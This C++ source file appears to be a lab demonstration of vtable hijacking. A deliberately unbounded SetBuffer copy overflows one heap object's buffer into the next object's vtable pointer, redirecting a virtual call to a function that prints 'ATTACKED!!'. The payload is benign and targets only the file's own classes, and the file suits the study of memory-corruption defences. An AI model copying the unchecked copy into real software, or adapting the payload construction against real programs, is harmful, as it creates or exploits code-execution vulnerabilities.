#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <iostream>
#include <malloc.h>

using namespace std;

#define bufferSize 64
class BaseClass
{
    private:
        char Buffer[bufferSize];
    public:
        void SetBuffer(char *string, int size)
        {
            // printf("%p %d\n", Buffer, Buffer);
            printf("BufferAddress = %p\n", Buffer);

            char* to = Buffer + bufferSize - 1;
            char* from = string + size - 1;

            for (int i = 0; i < size; ++i) {
                *to = *from;
                to--;
                from--;
                // cout << "iter " << i+1 << " of " << size <<endl;
            }
            cout << "copied\n";
            // strcpy(Buffer,string);
        }
        virtual void PrintBuffer()
        {
            printf("%s\n",Buffer);
        }
};

class MyClass1:public BaseClass
{
    public:
        void PrintBuffer()
        {
            printf("MyClass1: ");
            BaseClass::PrintBuffer();
        }
};

class MyClass2:public BaseClass
{
    public:
        void PrintBuffer()
        {
            printf("MyClass2: ");
            BaseClass::PrintBuffer();
        }
};

void foo() {
    printf("ATTACKED!!");

}
char *generateBuffer(uint64_t BufferAddress, int buffSize) {
    char *buffer;
    uint64_t *ptrArray;
    int i;
    int numEntries = 5;

    buffer=(char*)calloc( buffSize + sizeof(void*), sizeof(char) );  // buff + vptr
    
    ptrArray=(uint64_t*)buffer;

    for (i=0; i < buffSize + sizeof(void*) - 1; i++) buffer[i] = '\x90';  // fills the buffer with 90h NOP

    ptrArray[0] = BufferAddress; // make it point to the start of vtable;
    // printf("In generateBuffer %p %d\n", ptrArray[0], BufferAddress);
    // cout << buffer << endl;
    // cout << ptrArray[0] << "   " << BufferAddress << endl;

    for (i=1; i <= numEntries; i++) ptrArray[i] = (uint64_t)&foo;  // make the enteries point to the payload 
    // for (i=1; i <= numEntries; i++) ptrArray[i] = BufferAddress + (sizeof(void*) * numEntries);  // make the enteries point to the payload 

    // printf("pointer is %p size is %d \n", ptrArray[0], sizeof(void*));
    // cout << ptrArray[0] << "   " << ptrArray[1] << "   "<< ptrArray[2] << "   "<< ptrArray[3] << "   "<< endl;

    ptrArray[i] = (uint64_t)&foo; // code to execute;
    // ptrArray[i] = '\xCC'; // code to execute;

    // cout << buffer << endl;
    buffer[buffSize + sizeof(void*)] = '\x00';  // null character at the end of the string
    // cout << buffer << endl;


    return buffer; 
}


int main()
{
    BaseClass *Object[2];

    Object[0] = new MyClass1;
    Object[1] = new MyClass2; 

    // Object[0]->SetBuffer("string1", 7);

    char* buffer = generateBuffer((uint64_t)Object[1] + sizeof(void*), bufferSize);

    printf("*********************\n\n\n");
    printf("BufferAddress passed = %p\n", (uint64_t)Object[1] + sizeof(void*));

    uint64_t* ptrArray = (uint64_t*) buffer;
    for (int i = 0; i < (bufferSize + sizeof(void*)) / sizeof(void*); ++i)
    {
        printf("%p ", ptrArray[i]);
    }
    printf("\n");
    Object[1]->SetBuffer(buffer, bufferSize + sizeof(void*));

    // cout << "len = " << strlen(buffer) << endl << buffer << endl;


    // Object[0]->PrintBuffer();
    Object[1]->PrintBuffer();
}
